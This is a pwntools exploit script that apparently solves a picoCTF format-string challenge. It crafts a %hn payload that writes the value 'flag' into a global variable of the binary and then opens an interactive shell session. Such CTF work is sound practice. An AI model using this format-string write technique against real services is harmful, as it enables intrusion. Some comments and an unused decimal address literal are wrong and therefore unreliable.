#!/usr/bin/env python3
import os
from pwn import *
from pwn_ext import *

exe = ELF("./vuln")

context.binary = exe
# GDB Compatability stuff
if "alacritty" in os.environ["TERM"]:
    context.terminal = ["alacritty", "-e"]
elif "tmux" in os.environ["TERM"]:
    context.terminal = ["tmux", "splitw", "-h"]
elif os.environ["GNOME_TERMINAL_SCREEN"]:
    context.terminal = ["gnome-terminal", "--"]

# Who needs more than one process?
if args.REMOTE:
    #p = remote("addr", 1337)
    p = nc_remote("rhea.picoctf.net:55094") # just put entire nc command or host:port here
elif args.CLEAN:
    p = process([exe.path])
else:
    gdbscript = '''

    '''
    p = gdb.debug([exe.path], gdbscript=gdbscript)

### PUT ACTUAL PWN STUFF BELOW THIS LINE ###

def main():
    # good luck pwning :)
    sus_location = p64(404060)
    p.recvuntil(b'say?')
    # Split the target value in two, accountinf or endiannes (little) then use %hn to write 4 bytes at a time. 
    # 0x67616c66
    target_small = 0x6761 # in decimal: 26465
    target_large = 0x6c66 # in decimal: 27750

    # We find the offset by finding our own input on the stack.
    offset_small = 20
    offset_large = 19
    # Use the characters present on the stack to print large values
    # payload = b'%26464d,%' + offset_large + b'$hn%1281dAAAA%19$hnx,'
    # we need to provide the address of which we want to write to by finding the place
    # on the stack where our input is. Then provide the address ourselves to %hn

    # What are the %22$llx?
    payload = b'%26464d,%20$hn%1281dAAAA%19$hnx,%22$llx,\x60\x40\x40\x00\x00\x00\x00\x00\x62\x40\x40\x00\x00\x00\x00\x00'
    p.sendline(payload)
    p.interactive()

if __name__ == "__main__":
    main()
